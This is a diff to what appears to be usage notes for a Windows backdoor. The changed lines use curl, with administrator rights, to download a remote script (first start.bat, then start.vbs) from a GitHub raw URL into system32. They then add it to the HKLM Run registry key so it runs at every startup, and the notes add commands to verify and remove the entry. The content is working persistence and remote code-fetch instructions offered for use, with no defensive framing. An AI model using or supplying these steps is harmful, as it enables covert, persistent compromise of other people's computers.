@@ -48,8 +48,8 @@ after transfering python32.exe or python64.exe based on the arch of the system
 With Administrator Privs
 backdoor runs after BIOS : 
 cd C:\Windows\system32
-curl https://raw.githubusercontent.com/0x2034/shell/main/start.bat -o start.bat
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.bat" /f
+curl https://raw.githubusercontent.com/omarsamyX0/shell3/main/start.vbs -o start.vbs
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start" /t REG_SZ /d "%SystemRoot%\System32\start.vbs" /f
 to verify it's added : 
 reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "start"
 to delete it :
